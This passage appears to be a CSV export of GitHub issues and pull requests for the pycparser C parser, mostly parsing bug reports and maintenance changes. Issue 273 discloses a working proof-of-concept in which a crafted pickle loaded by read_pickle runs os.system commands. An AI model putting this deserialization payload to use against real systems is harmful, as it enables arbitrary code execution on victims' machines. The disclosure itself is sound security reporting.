The error draws me crazy because pycparser is installed as PyMySQL dependency (or maybe as cffi 1.11.5) dependency) and it blocks me to create new version of my app...",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/291/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/291/comments,https://api.github.com/repos/eliben/pycparser/issues/291/events,https://github.com/eliben/pycparser/issues/291,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/290,377085767,MDU6SXNzdWUzNzcwODU3Njc=,290,Add `NodeTransformer`?,10323518,closed,FALSE,NA,NA,1,2018-11-03T19:28:13Z,2018-11-05T18:36:18Z,2018-11-05T18:36:17Z,NONE,NA,"It would be nice if the package can provide a NodeTransformer as the python's ast package does, since this already has a NodeVisitor class.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/290/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/290/comments,https://api.github.com/repos/eliben/pycparser/issues/290/events,https://github.com/eliben/pycparser/issues/290,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/289,376301653,MDU6SXNzdWUzNzYzMDE2NTM=,289,Parse postgresql -pycparser.plyparser.ParseError before: pgwin32_signal_event,44602279,closed,FALSE,NA,NA,3,2018-11-01T08:39:22Z,2019-02-16T13:44:40Z,2018-11-01T12:09:09Z,NONE,NA,"I need to parse an open-source project Postgresql using pycparser. 

While parsing its source-code the following error arises:
Traceback (most recent call last):
  File ""examples\using_cpp_libc.py"", line 48, in <module>
    getAllFiles(projectName)
  File ""examples\using_cpp_libc.py"", line 29, in getAllFiles
    ast = parse_file(dirName+'\\'+fname, use_cpp = True, cpp_path = 'cpp', cpp_args = [r'-nostdinc',r'-Iutils/fake_libc_include',r'-Iprojects/postgresql/src/include'])
  File ""G:\python\pycparser-master\pycparser\__init__.py"", line 92, in parse_file
    return parser.parse(text, filename)
  File ""G:\python\pycparser-master\pycparser\c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""G:\python\pycparser-master\pycparser\ply\yacc.py"", line 334, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""G:\python\pycparser-master\pycparser\ply\yacc.py"", line 1204, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""G:\python\pycparser-master\pycparser\ply\yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""G:\python\pycparser-master\pycparser\c_parser.py"", line 1838, in p_error
    column=self.clex.find_tok_column(p)))
  File ""G:\python\pycparser-master\pycparser\plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
**pycparser.plyparser.ParseError: projects/postgresql/src/include/pg_config_os.h:366:15: before: pgwin32_signal_event**

I am using postgresql-9.6.9, build it using visual studio express 2017 on windows 10 (64-bit)",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/289/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/289/comments,https://api.github.com/repos/eliben/pycparser/issues/289/events,https://github.com/eliben/pycparser/issues/289,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/288,375642685,MDU6SXNzdWUzNzU2NDI2ODU=,288,No wheels on PyPi,941331,closed,FALSE,NA,NA,6,2018-10-30T18:52:59Z,2019-10-06T11:16:35Z,2019-04-19T12:38:14Z,NONE,NA,"Would be super nice if we had .whl (Python wheel) files in PyPi:
https://pypi.org/project/pycparser/#files
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/288/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/288/comments,https://api.github.com/repos/eliben/pycparser/issues/288/events,https://github.com/eliben/pycparser/issues/288,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/287,374221611,MDU6SXNzdWUzNzQyMjE2MTE=,287,Extracting more information about for loop inside a function,26171922,closed,FALSE,NA,NA,1,2018-10-26T04:23:54Z,2019-08-26T22:14:05Z,2019-08-26T22:14:05Z,NONE,NA,How do I exactly know how many times a for loop can execute using pycparser?,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/287/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/287/comments,https://api.github.com/repos/eliben/pycparser/issues/287/events,https://github.com/eliben/pycparser/issues/287,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/286,373387575,MDU6SXNzdWUzNzMzODc1NzU=,286,ParseError in fake_typedefs,2306230,closed,FALSE,NA,NA,1,2018-10-24T09:26:15Z,2018-10-24T13:42:02Z,2018-10-24T13:42:02Z,NONE,NA,"```
pycparser.plyparser.ParseError: [...]/python3.5/site-packages/autopxd/include/_fake_typedefs.h:151:9: Invalid declaration
```

The line in question is:
```
/* C99 stdbool.h bool type. _Bool is built-in in C99 */
typedef _Bool bool;
```

The likely cause for this is that our own headers use a custom define for the bool type instead of including stdbool.h. In general though, always including all the typedefs in _fake_typedefs.h creates this issue since they create unexpected typedefs.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/286/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/286/comments,https://api.github.com/repos/eliben/pycparser/issues/286/events,https://github.com/eliben/pycparser/issues/286,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/285,372773190,MDU6SXNzdWUzNzI3NzMxOTA=,285,Why pycparser can not parse multiple func call in one single line??,31725114,closed,FALSE,NA,NA,1,2018-10-23T02:02:56Z,2018-10-23T21:06:43Z,2018-10-23T21:06:43Z,NONE,NA,"source code:
int func_call(int a, int b)
{
	return a + b;
}

int main()
{
	func_call(3, 4);
	printf(""result is: %d\n"", func_call(5,6));
}

When I use the pycparser example file 'func_calls.py' in pycparser-master\examples folder to test this source code:
![image](https://user-images.githubusercontent.com/31725114/47330326-67429000-d6aa-11e8-9d7d-0c3372d797ac.png)
But I only got one 'func_call' result. But from the source code we can find that there are to 'func_call' , one is 'func_call(3,4)', another is 'printf(""result is: %d\n"", func_call(5,6));'
Why it only shows only one result?? 
Result: 
clang  -E -ID:\Tools\pycparser-master\utils\fake_libc_include D:\py\ctest2.cpp
func_call called at D:\\py\\ctest2.cpp:30:2",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/285/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/285/comments,https://api.github.com/repos/eliben/pycparser/issues/285/events,https://github.com/eliben/pycparser/issues/285,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/284,372409346,MDU6SXNzdWUzNzI0MDkzNDY=,284,Is it possible to support cpp code by adding or rewriting some modules?,16043488,closed,FALSE,NA,NA,1,2018-10-22T06:41:36Z,2019-08-26T22:13:57Z,2019-08-26T22:13:57Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/284/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/284/comments,https://api.github.com/repos/eliben/pycparser/issues/284/events,https://github.com/eliben/pycparser/issues/284,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/283,365210132,MDU6SXNzdWUzNjUyMTAxMzI=,283,"unable to handle extern ""C""",32964482,closed,FALSE,NA,NA,2,2018-09-30T09:43:23Z,2018-10-03T09:01:51Z,2018-09-30T12:36:56Z,NONE,NA,"Hello,I met the following problem while dump_ast,the source code was:
```
#ifdef __cplusplus
extern ""C"" {
#endif

#include ""goo/gtypes.h""
```

and the error was:
```
Traceback (most recent call last):
  File ""examples/dump_ast.py"", line 24, in <module>
    ast = parse_file(args.filename, use_cpp=False)
  File ""./pycparser/__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""./pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""./pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""./pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""./pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""./pycparser/c_parser.py"", line 1848, in p_error
    column=self.clex.find_tok_column(p)))
  File ""./pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: poppler-0.68.0/utils/parseargs.h:28:8: before: ""C""
```

What can I do to overcome this..or we can't solve this problem yet. thx :P",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/283/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/283/comments,https://api.github.com/repos/eliben/pycparser/issues/283/events,https://github.com/eliben/pycparser/issues/283,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/282,365166091,MDU6SXNzdWUzNjUxNjYwOTE=,282,Coord Line of iffalse in an if-else statement,43709687,closed,FALSE,NA,NA,1,2018-09-29T20:52:47Z,2020-03-03T14:40:13Z,2020-03-03T14:40:13Z,NONE,NA,"I tried to parse some C code with pycparser. I'm using the your sample code, func_defs.py as base.

I want to get the line in which the ""else"" word appear on the source code. I used visit_If to visit if-else statement as follows

```
def visit_If(self, node):
   if node.iffalse is not None:
      else_node = node.iffalse
      else_node.show(showcoord=True)
      self.generic_visit(else_node)
```

Using a sample code below
```
int main()
{
    int x = 0;
    int y = 1;

    if(x == 0)
    {
        x++;
    }
    else
    {
        y++;
    }
}
```

The output of it is:
```
Compound:  (at ./code.c:11:1)
  UnaryOp: p++ (at ./code.c:12:9)
    ID: y (at ./code.c:12:9)
```

Line 11 points to ""{"". There is no indication on what line ""else"" appeared on the code.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/282/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/282/comments,https://api.github.com/repos/eliben/pycparser/issues/282/events,https://github.com/eliben/pycparser/issues/282,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/281,361977507,MDU6SXNzdWUzNjE5Nzc1MDc=,281,version 2.19 broke compatibility with python 2.6,3700430,closed,FALSE,NA,NA,1,2018-09-20T00:46:34Z,2018-09-20T12:10:47Z,2018-09-20T12:10:36Z,NONE,NA,"Hi guys,

We now get the following error when installing package that pull the latest (2.19) version of pycparser on python 2.6. 
```
File ""/usr/lib/python2.6/site-packages/pycparser/__init__.py"", line 14, in <module>
        from subprocess import check_output
    ImportError: cannot import name check_output
```

We know that python 2.6 is super old but it's still the version ship with CentOS 6. Feel free to drop support, a note about this in the change log would be appreciated. 

Thanks for your time,
David",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/281/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/281/comments,https://api.github.com/repos/eliben/pycparser/issues/281/events,https://github.com/eliben/pycparser/issues/281,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/280,361354225,MDU6SXNzdWUzNjEzNTQyMjU=,280,publish new release to pypi,6022600,closed,FALSE,NA,NA,1,2018-09-18T15:12:05Z,2018-09-20T12:46:14Z,2018-09-20T12:46:14Z,NONE,NA,"Hi,
i was running in a problem. i checked the source on github and noticed it is already fixed (#197). 
This fix is not published with a new release on pypi :-( 
Any plans to publish one?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/280/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/280/comments,https://api.github.com/repos/eliben/pycparser/issues/280/events,https://github.com/eliben/pycparser/issues/280,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/279,357131367,MDU6SXNzdWUzNTcxMzEzNjc=,279,"Is there any way I can ignore new types? I have a huge c file, it's hard to typedef all of them out.",42942841,closed,FALSE,NA,NA,2,2018-09-05T09:00:02Z,2018-09-05T12:17:31Z,2018-09-05T12:17:31Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/279/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/279/comments,https://api.github.com/repos/eliben/pycparser/issues/279/events,https://github.com/eliben/pycparser/issues/279,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/278,356557837,MDU6SXNzdWUzNTY1NTc4Mzc=,278,Cannot apply to my own function type,42942841,closed,FALSE,NA,NA,2,2018-09-03T16:18:20Z,2018-09-04T19:48:01Z,2018-09-04T12:32:00Z,NONE,NA,"from __future__ import print_function
import sys
from pycparser import parse_file
from pycparser import c_parser

text = r""""""
U1 funcOne(int a, int b){
    a = 1;
    b = 2;
    c = a + b;
    return c;

}
""""""

parser = c_parser.CParser(text)
ast = parser.parse(text)
print(""Structure 01:"")
ast.show()

**Output: ParseError(':2:4: before: funcOne',)**


### If I change function type from ""U1"" to ""void"", this script works fine. But why it cannot accept my own function type? Thank you.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/278/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/278/comments,https://api.github.com/repos/eliben/pycparser/issues/278/events,https://github.com/eliben/pycparser/issues/278,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/277,355900355,MDExOlB1bGxSZXF1ZXN0MjEyMzIwNDIy,277,"Correct Parsing of Floating Point Literals, issue #253",5983803,closed,FALSE,NA,NA,1,2018-08-31T09:09:59Z,2018-08-31T13:00:15Z,2018-08-31T13:00:15Z,CONTRIBUTOR,NA,"This sets the type attribute to either 'float', 'long double' or 'double' depending on if 'f|F', 'l|L' or '' is specified at the end of the constant definition. This should fix issue #253 .",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/277/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/277/comments,https://api.github.com/repos/eliben/pycparser/issues/277/events,https://github.com/eliben/pycparser/pull/277,https://api.github.com/repos/eliben/pycparser/pulls/277
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/276,350541712,MDU6SXNzdWUzNTA1NDE3MTI=,276,pycparser + clang fail to parse pythread.h in python 3.7 - error: require native threads.,7870949,closed,FALSE,NA,NA,3,2018-08-14T18:19:38Z,2018-11-03T12:38:09Z,2018-08-15T13:28:17Z,NONE,NA,"Changes made to python 3.7 now cause failure of parsing in pythread.h by clang:

https://travis-ci.org/pythonnet/pythonnet/jobs/415741697#L1999

```
/opt/python/3.7.0/include/python3.7m/pythread.h:122:5: error: ""Require native
      threads. See https://bugs.python.org/issue31370""
#   error ""Require native threads. See https://bugs.python.org/issue31370""
```

Do I need to provide fake libc include for pythread.h or does this require some arguments to clang?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/276/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/276/comments,https://api.github.com/repos/eliben/pycparser/issues/276/events,https://github.com/eliben/pycparser/issues/276,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/275,343360344,MDExOlB1bGxSZXF1ZXN0MjAzMDI5NzUw,275,add support for structs/unions with 0 fields.,6422442,closed,FALSE,NA,NA,5,2018-07-21T22:29:41Z,2018-07-26T13:18:43Z,2018-07-26T13:18:43Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/275/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/275/comments,https://api.github.com/repos/eliben/pycparser/issues/275/events,https://github.com/eliben/pycparser/pull/275,https://api.github.com/repos/eliben/pycparser/pulls/275
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/274,343360029,MDU6SXNzdWUzNDMzNjAwMjk=,274,fails parsing structs/unions with 0 field,6422442,closed,FALSE,NA,NA,0,2018-07-21T22:22:38Z,2018-07-26T13:19:00Z,2018-07-26T13:19:00Z,NONE,NA,"currently, the library fails parsing empty structure/union definitions such as 
```C
struct {
} foo;

union
{
} bar;
```
I'm not sure if it is allowed by the **C99** standard, but at least **GCC** does not complains when compiling such a definition with the ```-std=c99``` flag.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/274/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/274/comments,https://api.github.com/repos/eliben/pycparser/issues/274/events,https://github.com/eliben/pycparser/issues/274,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/273,342591936,MDU6SXNzdWUzNDI1OTE5MzY=,273,read_pickle method is vulnerable ,33394474,closed,FALSE,NA,NA,12,2018-07-19T06:14:18Z,2018-09-06T21:39:01Z,2018-08-29T13:13:48Z,NONE,NA,"```from pycparser.ply.yacc import LRTable
import pickle
class joel_test(object):
    def __reduce__(self):
        return eval, (""os.system('calc.exe')"",)
test = joel_test()
f=open('joel_test','wb')
pickle.dump(test,f)
f.close()
joel=LRTable()
joel.read_pickle('joel_test')
```
Hi, there is a vulnerability in read_pickle method in yacc.py, please see PoC above. It can execute arbitrary python commands resulting in command execution.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/273/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/273/comments,https://api.github.com/repos/eliben/pycparser/issues/273/events,https://github.com/eliben/pycparser/issues/273,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/272,338919133,MDU6SXNzdWUzMzg5MTkxMzM=,272,Incorrect Parsing of Floating Point Literals #2,13495821,closed,FALSE,NA,NA,1,2018-07-06T12:23:04Z,2018-07-06T12:27:34Z,2018-07-06T12:27:34Z,NONE,NA,"The following floating point literals are not parsed correctly:

``float foo = 123.456;``
``float foo = 123.456f;``
``float foo = 123.456F;``
``float foo = 1.234f;``
``float foo = 1.234F;``

So there seems to be a problem with
- float literals with more than 1 digit before the decimal separator
- float literals with the explicit ""single"" suffix (f or F) appended to the literal

The values are parsed to ""None""",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/272/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/272/comments,https://api.github.com/repos/eliben/pycparser/issues/272/events,https://github.com/eliben/pycparser/issues/272,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/271,336439993,MDExOlB1bGxSZXF1ZXN0MTk3ODkzMTcz,271,Drop testing for EOL Pythons 3.2 & 3.3,347634,closed,FALSE,NA,NA,0,2018-06-28T01:19:12Z,2018-06-28T13:12:25Z,2018-06-28T13:12:25Z,CONTRIBUTOR,NA,"Python 3.2 and 3.3 are end of life. They are no longer receiving bug fixes, including for security issues. Python 3.3 went EOL on 2017-09-29 and Python 3.2 on 2016-02-20. For additional details on supported Python versions, see:

https://devguide.python.org/#status-of-python-branches

Removing support for EOL Pythons will reduce necessary testing and maintenance resources.

Pass [`python_requires`](https://packaging.python.org/tutorials/distributing-packages/#python-requires) argument to `setuptools` to help pip decide what version of the library to install.

Using [pypinfo](https://github.com/ofek/pypinfo), here are the download statistics for the last 30 days, showing very minimal use of these EOL pythons:

$ pypinfo --percent pycparser pyversion

| python_version | percent | download_count |
| -------------- | ------- | -------------- |
| 2.7            |  71.64% |      1,373,309 |
| 3.6            |  15.78% |        302,407 |
| 3.5            |   8.32% |        159,452 |
| 3.4            |   3.80% |         72,850 |
| 2.6            |   0.32% |          6,187 |
| 3.7            |   0.12% |          2,263 |
| 3.3            |   0.02% |            360 |
| 3.2            |   0.00% |             15 |
| 3.8            |   0.00% |              5 |
| None           |   0.00% |              1 |",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/271/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/271/comments,https://api.github.com/repos/eliben/pycparser/issues/271/events,https://github.com/eliben/pycparser/pull/271,https://api.github.com/repos/eliben/pycparser/pulls/271
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/270,335698819,MDU6SXNzdWUzMzU2OTg4MTk=,270,Is it possible to have .i files as input?,10261223,closed,FALSE,NA,NA,1,2018-06-26T07:50:23Z,2018-06-26T17:33:43Z,2018-06-26T17:33:43Z,NONE,NA,I have a ton of `.i` files which are generated using `gcc -E -I[path/to/include] xxx.c`. I noticed that pycparser can generate ast using `gcc` command showed in `using_gcc_E_libc.py`. Can it generate ast from `.i` files instead of `.c`?,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/270/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/270/comments,https://api.github.com/repos/eliben/pycparser/issues/270/events,https://github.com/eliben/pycparser/issues/270,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/269,333009406,MDExOlB1bGxSZXF1ZXN0MTk1MzQ1NTEy,269,Avoid opening files with deprecated 'U' mode,347634,closed,FALSE,NA,NA,1,2018-06-16T19:24:50Z,2018-06-26T23:22:24Z,2018-06-26T20:48:32Z,CONTRIBUTOR,NA,"Opening files with 'U' mode is deprecated. When running tests with Python warnings enabled, the warnings of the following form are emitted:

```
  DeprecationWarning: 'U' mode is deprecated
    return open(name, 'rU')
```

To open files with universal newlines on both Ptyhon 2 & 3, use the io module. It defaults to opening with universal newlines and doesn't emit a warning.

https://docs.python.org/3/library/io.html

> When reading input from the stream, if newline is None, universal newlines mode is enabled.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/269/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/269/comments,https://api.github.com/repos/eliben/pycparser/issues/269/events,https://github.com/eliben/pycparser/pull/269,https://api.github.com/repos/eliben/pycparser/pulls/269
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/268,333008895,MDExOlB1bGxSZXF1ZXN0MTk1MzQ1MjA0,268,Use more specific assertIsInstance in tests,347634,closed,FALSE,NA,NA,0,2018-06-16T19:16:23Z,2018-06-26T23:22:22Z,2018-06-26T20:49:06Z,CONTRIBUTOR,NA,"When running tests with Python warnings enabled, warnings of the following form appear:

```
DeprecationWarning: Please use assertTrue instead.
  self.failUnless(isinstance(...))
```

Use `assertIsInstance` instead to fix these warnings.

Using a more specific assert also has the advantage of more informative error reporting upon failure.

https://docs.python.org/3/library/unittest.html#unittest.TestCase.assertTrue

> This method should also be avoided when more specific methods are
> available (e.g. assertEqual(a, b) instead of assertTrue(a == b)),
> because they provide a better error message in case of failure.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/268/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/268/comments,https://api.github.com/repos/eliben/pycparser/issues/268/events,https://github.com/eliben/pycparser/pull/268,https://api.github.com/repos/eliben/pycparser/pulls/268
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/267,333007044,MDExOlB1bGxSZXF1ZXN0MTk1MzQ0MTU1,267,Use https:// for all project links where available,347634,closed,FALSE,NA,NA,0,2018-06-16T18:46:34Z,2018-06-26T23:22:29Z,2018-06-26T20:49:36Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/267/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/267/comments,https://api.github.com/repos/eliben/pycparser/issues/267/events,https://github.com/eliben/pycparser/pull/267,https://api.github.com/repos/eliben/pycparser/pulls/267
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/266,333006670,MDExOlB1bGxSZXF1ZXN0MTk1MzQzOTMz,266,Remove unnecessary __future__ import,347634,closed,FALSE,NA,NA,1,2018-06-16T18:40:56Z,2018-06-26T23:22:33Z,2018-06-26T20:50:01Z,CONTRIBUTOR,NA,"Generators have been available since 2.3. The feature is automatically included in all supported Pythons.

For additional details, see:

https://docs.python.org/3/library/__future__.html",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/266/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/266/comments,https://api.github.com/repos/eliben/pycparser/issues/266/events,https://github.com/eliben/pycparser/pull/266,https://api.github.com/repos/eliben/pycparser/pulls/266
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/265,332968105,MDExOlB1bGxSZXF1ZXN0MTk1MzIxNzU2,265,add more x11 related files,5418152,closed,FALSE,NA,NA,0,2018-06-16T07:33:28Z,2018-06-26T20:47:10Z,2018-06-26T20:47:10Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/265/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/265/comments,https://api.github.com/repos/eliben/pycparser/issues/265/events,https://github.com/eliben/pycparser/pull/265,https://api.github.com/repos/eliben/pycparser/pulls/265
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/264,332720787,MDU6SXNzdWUzMzI3MjA3ODc=,264,Dependency on cpp,25422924,closed,FALSE,NA,NA,0,2018-06-15T10:17:03Z,2018-06-15T10:44:13Z,2018-06-15T10:44:13Z,NONE,NA,"Dear pycparser Developers, 

is true that pycparser need cpp installed on the machine to work?

I am asking because yocto recipe of pycparser explicitely requires it

https://github.com/openembedded/meta-openembedded/commit/a4a1950e36a86bcc3e60fffdb0bbe5bc98d9daf0
```
RDEPENDS_${PN}_class-target += ""\
    ${PYTHON_PN}-netclient \
    ${PYTHON_PN}-ply \
    ${PYTHON_PN}-pprint \
    cpp \
    cpp-symlinks \
    ""
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/264/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/264/comments,https://api.github.com/repos/eliben/pycparser/issues/264/events,https://github.com/eliben/pycparser/issues/264,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/263,332251237,MDU6SXNzdWUzMzIyNTEyMzc=,263,constant volatile pointers,39893843,closed,FALSE,NA,NA,3,2018-06-14T04:54:33Z,2018-06-15T12:35:01Z,2018-06-15T12:35:01Z,NONE,NA,"Is there a way constant volatile pointer be parsed?
Say in the lines of ""const volatile *const a=&x;""",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/263/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/263/comments,https://api.github.com/repos/eliben/pycparser/issues/263/events,https://github.com/eliben/pycparser/issues/263,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/262,330933969,MDExOlB1bGxSZXF1ZXN0MTkzODA1MDI5,262,Update pypi.python.org URL to pypi.org,347634,closed,FALSE,NA,NA,1,2018-06-10T02:14:28Z,2018-06-26T23:22:35Z,2018-06-10T12:21:30Z,CONTRIBUTOR,NA,"For details on the new PyPI, see the blog post:

https://pythoninsider.blogspot.ca/2018/04/new-pypi-launched-legacy-pypi-shutting.html",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/262/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/262/comments,https://api.github.com/repos/eliben/pycparser/issues/262/events,https://github.com/eliben/pycparser/pull/262,https://api.github.com/repos/eliben/pycparser/pulls/262
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/261,325784456,MDExOlB1bGxSZXF1ZXN0MTkwMDM2MDc4,261,fastfix: func.__doc__ is not mandatory,4798932,closed,FALSE,NA,NA,9,2018-05-23T16:32:06Z,2018-05-24T13:37:07Z,2018-05-24T13:21:45Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/261/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/261/comments,https://api.github.com/repos/eliben/pycparser/issues/261/events,https://github.com/eliben/pycparser/pull/261,https://api.github.com/repos/eliben/pycparser/pulls/261
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/260,324733569,MDExOlB1bGxSZXF1ZXN0MTg5MjQ3Nzg2,260,Replace a call to Popen by check_output in order to check that cpp returns 0.,1629419,closed,FALSE,NA,NA,1,2018-05-20T19:09:36Z,2018-05-21T16:27:31Z,2018-05-21T13:20:45Z,CONTRIBUTOR,NA,"At the moment, if cpp fails, no error/exception is generated and pycparser continues.
Calling check_output instead of Popen solves this.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/260/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/260/comments,https://api.github.com/repos/eliben/pycparser/issues/260/events,https://github.com/eliben/pycparser/pull/260,https://api.github.com/repos/eliben/pycparser/pulls/260
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/259,324668182,MDU6SXNzdWUzMjQ2NjgxODI=,259,Function prototypes with pointer to pointer params,6561800,closed,FALSE,NA,NA,2,2018-05-19T23:25:51Z,2018-05-21T13:47:31Z,2018-05-21T13:47:31Z,NONE,NA,"I'm trying to parse a real-world C source code (QEMU) with pycparser. It chokes on function prototypes containing pointer to pointer params like this:

```
typedef struct Error {
    int dummy;
} Error;
void func_with_pp_param(const char *, Error **);
```

Adding a name to the last param, i.e.

`void func_with_pp_param(const char *, Error **p);`

makes the parsing magically work.

Any chances to get a support for such constructs in pycparser?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/259/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/259/comments,https://api.github.com/repos/eliben/pycparser/issues/259/events,https://github.com/eliben/pycparser/issues/259,NA
